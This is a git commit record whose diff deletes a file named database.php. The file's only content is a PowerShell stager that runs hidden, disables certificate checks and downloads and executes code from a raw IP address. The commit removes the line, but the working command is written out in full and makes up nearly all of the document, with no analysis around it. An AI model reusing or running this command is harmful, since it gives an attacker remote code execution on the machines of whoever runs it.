060b7b196442469b437032a235d50f60e054740c
Thisisfun200 <thisisfun1000@yopmail.com>
2016-01-20 19:40:32 -0500

    removing file
    blah

--- database.php
+++
@@ -1,1 +0,0 @@
-powershell.exe -nop -w hidden -c "[Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; IEX ((new-object net.webclient).downloadstring('https://104.41.172.78:443/a'))"
